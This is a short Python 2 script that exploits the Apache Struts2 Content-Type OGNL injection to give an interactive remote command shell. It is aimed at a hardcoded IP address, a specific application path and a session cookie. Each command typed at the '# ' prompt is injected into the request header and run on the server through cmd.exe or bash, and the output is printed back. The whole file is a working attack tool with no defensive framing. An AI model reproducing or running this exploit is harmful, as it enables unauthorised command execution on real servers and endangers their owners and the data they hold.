import urllib2
from poster.streaminghttp import register_openers
import httplib

httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'


while (1):
    register_openers()
    cmd = raw_input("# ")
    header = {
        "Host": "223.202.67.42:8080",
        "Accept": "*/*",
        "Origin": "http://223.202.67.42:8080",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
        "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())};application/x-www-form-urlencoded",
        "Referer": "http://223.202.67.42:8080/RenDa/suggestion.jsp",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8",
        "Cookie": "JSESSIONID=D8DB19A684E83220B1152F165221B4BF",
        "Connection": "close",
    }

    data = "title=%E6%A3%80%E4%B8%BE&name=%E6%9D%8E%E5%BB%BA%E5%9B%BD&address=15403921331&" \
           "email=15403921331%40154.cn&sugtype=2&memo=w&number=0136"

    r = urllib2.Request("http://223.202.67.42:8080/RenDa/SuggestionAdd", data=data, headers=header)
    print urllib2.urlopen(r).read()
